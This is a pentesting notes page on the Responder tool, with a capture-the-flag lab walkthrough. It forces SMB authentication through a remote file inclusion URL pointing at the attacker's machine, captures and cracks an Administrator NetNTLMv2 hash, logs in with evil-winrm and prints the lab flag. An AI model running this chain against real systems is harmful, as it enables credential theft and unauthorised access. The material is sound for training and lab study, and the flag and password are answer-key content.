# Responder
> Responder is a tool to capture hashes while connected onto a network. If a client/target cannot resolve a name via DNS, it will fall back to name resolution via LLMNR, NBT-NS and MDNS. If we have Responder running on the same network, it will essentially say "Hey, I'm who you're looking for" to all of the LLMNR and NBT-NS requests that we see, and the traffic is directed to us. 

## Contents
- [Installation & Syntax](#installation--syntax)
- [Common Errors](#common-errors)
  - [TCP Server, Port 80](#tcp-server-port-80)
  - [Next Error (whatever it may be)](#next-error-whatever-it-may-be)
- [Malicious SMB Server](#malicious-smb-server)
  - [Scenario](#scenario)
  - [Attack Overview](#attack-overview)
  - [Attack Set-Up](#attack-set-up)
    - [Start responder](#start-responder)
    - [Force the Hash: RFI](#force-the-hash-rfi)
    - [Capture the Hash: Responder](#capture-the-hash-responder)
    - [Crack the Hash: John](#crack-the-hash-john)
    - [Exploit with Evil-WinRM](#exploit-with-evil-winrm)

## Installation & Syntax
- In the case of Kali Linux, Responder is installed by default as a system utility, thus it can be launched just by running the command:
```
responder -I [network_interface]
```

----
## Common Errors

### TCP Server, Port 80
- If you get an error regarding not being able to start TCP server on `port 80`, it is because `port 80` is already being used by another service on the machine. 
- This error can be circumvented by altering the `Responder.conf` file to toggle `off` the "HTTP" entry which is listed under the "Servers to start" section.
  - This config file can be found in one of two place: 
  - Default System Install: `/usr/share/responder/Responder.conf`
  - GitHub Repo Clone: /installation_directory/Responder.conf
- Setting the "HTTP" flag to "Off" under the "Servers to start" section in the `Responder.conf` file:
```
; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On        #  chane "On" to "Off"

[** SNIP **]
```
### Next Error (whatever it may be)

----
## Malicious SMB Server

### Scenario
- In the PHP configuration file `php.ini`, `allow_url_include` wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. 
- However, even if `allow_url_include` and `allow_url_fopen` are set to "Off", PHP will not prevent the loading of SMB URLs.
- In our case, we can misuse this functionality to steal the NTLM hash.
- Now, using [the example from this link](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) we can attempt to load a SMB URL, and in that process, we can capture the hashes from the target using Responder.

### Attack Overview
- Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB server. 
  - When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password. 
  - When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. 
- While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge-response, and if we find one, we know that is the password. 
  - This is often referred to as hash cracking, which we'll do with a program called John The Ripper

### Attack Set-Up

#### Start responder
```
responder -I [network_interface]
```

#### Force the Hash: RFI
- [RFI: Remote File Inclusion](/05_Vulnerability_Assessment/file_inclusion_remote.md)
- With the Responder server ready, we tell the server to include a resource from our SMB server by setting the page parameter as follows via the web browser.- 
```
http://unika.htb/?page=//[attack machine ip]/somefile
```
- Because in this scenario we have the freedom to specify the address for the SMB share, we specify the IP address of our attacking machine. 
- Now the server tries to load the resource from our SMB server, and Responder captures enough of that to get the NetNTLMv2.
- Note: Make sure to add `http://` in the address as some browsers might opt for a Google search instead of navigating to the appropriate page.
- After sending our payload through the web browser we get an error about not being able to load the requested file (because it doesn't exist and we don't care).

#### Capture the Hash: Responder
- On checking our listening Responder server we can see we have a NetNTLMv for the Administrator user.
- The NetNTLMv2 includes both the challenge (random text) and the encrypted response.
```
[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:9f588ec010af5d68:4BFAFABBB79B9B1A0104A82BB0D3DB2D:0101000000000000809ED6830C67DA011611E316DB09ED7900000000020008004C004B003100580001001E00570049004E002D004F00300034004D004F004F00530046004D003200340004003400570049004E002D004F00300034004D004F004F00530046004D00320034002E004C004B00310058002E004C004F00430041004C00030014004C004B00310058002E004C004F00430041004C00050014004C004B00310058002E004C004F00430041004C0007000800809ED6830C67DA010600040002000000080030003000000000000000010000000020000002F44D4DF31257C5FAA63A38652FD4A82B473A2B0D4893AE6C495EEF60A2B9DB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00320035000000000000000000
```

#### Crack the Hash: John
- Copy the Admin hash to a text file: 
```
vim hash.txt  # copy and paste the hash and only the hash
cat hash.txt 
Administrator::RESPONDER:9f588ec010af5d68:4BFAFABBB79B9B1A0104A82BB0D3DB2D:0101000000000000809ED6830C67DA011611E316DB09ED7900000000020008004C004B003100580001001E00570049004E002D004F00300034004D004F004F00530046004D003200340004003400570049004E002D004F00300034004D004F004F00530046004D00320034002E004C004B00310058002E004C004F00430041004C00030014004C004B00310058002E004C004F00430041004C00050014004C004B00310058002E004C004F00430041004C0007000800809ED6830C67DA010600040002000000080030003000000000000000010000000020000002F44D4DF31257C5FAA63A38652FD4A82B473A2B0D4893AE6C495EEF60A2B9DB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00320035000000000000000000
```
- NOTE: Make sure you delete any and all whitespace following the hash. There should be no new-lines or spaces after the last hash character.
- John the Ripper to crack (crazy fast compared to crackmapexec): 
```
john -w=/usr/share/wordlists/rockyou.txt hash.txt 

# Output: 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2024-02-24 12:21) 3.846g/s 15753p/s 15753c/s 15753C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

#### Exploit with Evil-WinRM
- Use `evil-winrm` to login to the target machine via WinRm:
```
evil-winrm -u Administrator -p badminton -i 10.129.95.234
```
- Find the flag using the [Powershell equivalent of find](https://jessitron.com/2020/04/23/powershell-equivalent-of-find/)
```
*Evil-WinRM* PS C:\Users\Administrator> cd /
*Evil-WinRM* PS C:\> gci -r -fi 'flag*.*'

    Directory: C:\Users\mike\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt
```
- cat the flag: 
```
*Evil-WinRM* PS C:\users\mike\desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```
